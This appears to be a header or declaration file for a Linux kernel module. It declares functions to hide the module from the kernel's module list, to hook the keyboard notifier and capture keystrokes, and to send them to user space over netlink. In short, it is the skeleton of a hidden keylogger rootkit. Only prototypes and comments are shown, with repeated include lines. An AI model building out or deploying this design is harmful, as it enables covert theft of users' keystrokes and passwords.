#include <linux/module.h>
#include <net/sock.h>
#include <linux/netlink.h>
#include <linux/skbuff.h>
#include <linux/module.h>
#include <net/sock.h>
#include <linux/netlink.h>
#include <linux/skbuff.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/keyboard.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/notifier.h>


#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/version.h>

#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif
#define MY_NETLINK 30  // cannot be larger than 31, otherwise we shall get "insmod: ERROR: could not insert module netlink_kernel.ko: No child processes"
#define msg_size 10
void showme(void);
/*
@brief : This function shows the module incase it has been removed.
@param : prev_module : the previous module that has been removed.
@return : none.
*/
void hideme(void);
/*
@brief : This function hides the kernel module by simply removing something from a linked list.
@return : none.
*/
int notifier(struct notifier_block *block, unsigned long code, void *p);
/*
@brief : This function is responsible for handling key presses by taking over the keyboard driver.
@param : block : a struct that includes the keyboard paramaters, simply saying, it grants us the access to the keyboard driver.
@param : code: makes sure that the input is coming from the keyboard and not other devices.
@param : nlhead : a netlink message header structure we use to pass the information in to.
@param : skbout : this is the buffer we use to send it through the user space.
@return : the function returns 1.
*/
static void myNetLink_recv_msg(struct sk_buff *skb);
/*
@brief : This function is called when we want to recieve the first message from the userspace.
@param : skb : buffer.
@param : nlhead : a netlink message header structure we use to pass the information in to.
@return : none.
*/

static int __init myNetLink_init(void);
static void __exit myNetLink_exit(void);